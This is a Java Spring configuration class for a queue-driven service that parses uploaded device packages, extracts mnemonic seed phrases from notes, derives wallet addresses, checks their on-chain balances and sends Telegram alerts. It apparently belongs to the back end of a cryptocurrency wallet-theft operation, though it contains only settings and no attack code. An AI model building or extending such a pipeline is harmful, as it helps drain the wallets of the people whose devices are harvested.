package com.consumer.config;

import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.stereotype.Component;

import lombok.Data;

@Data
@Component
@ConfigurationProperties(prefix = "v26")
public class V26ConsumerProperties {

    private String uploadDir = "D:/v26_records/uploads";
    private String mnemonicAesKey = "";
    private Queue queue = new Queue();
    private Consumer consumer = new Consumer();

    @Data
    public static class Queue {
        private String deviceParse = "queue:device_parse";
        private String deviceParseV1 = "queue:device_parse_v1";
        private String mnemonicBalance = "queue:mnemonic_balance";
        private String mnemonicBalanceV1 = "queue:mnemonic_balance_v1";
        private String notesMnemonic = "queue:notes_mnemonic";
        private String notesMnemonicV1 = "queue:notes_mnemonic_v1";
        private String packageAddress = "queue:package_address";
        private String packageAddressV1 = "queue:package_address_v1";
        private String tgMessage = "queue:tg_message";
    }

    @Data
    public static class Consumer {
        /**
         * true：扫包入库走 device_parse，派生/查链/余额TG 走 mnemonic_balance（两条队列）。
         * false：解析线程里同步查链（一条队列，慢）。
         */
        private boolean deferBalance = true;
        private int maxRetries = 8;
        private int blpopTimeoutSec = 2;
        private int inflightTtlSec = 180;
        /** 每条助记词每链派生地址数；库表 wallet.address_derive_count 有值时优先 */
        private int deriveCount = 5;
        private Worker parse = Worker.of(8, 2, 64, 8);
        private Worker parseV1 = Worker.of(4, 2, 64, 8);
        private Worker notes = Worker.of(4, 2, 32, 4);
        private Worker notesV1 = Worker.of(2, 1, 32, 4);
        private Worker balance = Worker.of(16, 2, 64, 8);
        private Worker balanceV1 = Worker.of(8, 2, 64, 8);
        private Worker packageAddress = Worker.of(2, 1, 32, 4);
        private Worker packageAddressV1 = Worker.of(2, 1, 32, 4);
        private Worker telegram = Worker.of(4, 2, 64, 8);
        /** 单设备内并行解压扫包 */
        private Pool scanPool = Pool.of(4, 8, 64);
        private Pool scanPoolV1 = Pool.of(2, 4, 64);
        /** 打链上 RPC 的 HTTP 池（查余额） */
        private Pool balanceHttpPool = Pool.of(8, 12, 256);
        private Pool balanceHttpPoolV1 = Pool.of(4, 8, 128);
    }

    @Data
    public static class Worker {
        private int threads = 4;
        private int pollers = 2;
        private int queueCapacity = 64;
        private int popBatch = 8;

        public static Worker of(int threads, int pollers, int queueCapacity, int popBatch) {
            Worker w = new Worker();
            w.threads = threads;
            w.pollers = pollers;
            w.queueCapacity = queueCapacity;
            w.popBatch = popBatch;
            return w;
        }
    }

    @Data
    public static class Pool {
        private int coreSize = 4;
        private int maxSize = 8;
        private int queueCapacity = 64;
        private int keepAliveSeconds = 60;

        public static Pool of(int core, int max, int queue) {
            Pool p = new Pool();
            p.coreSize = core;
            p.maxSize = max;
            p.queueCapacity = queue;
            return p;
        }
    }
}
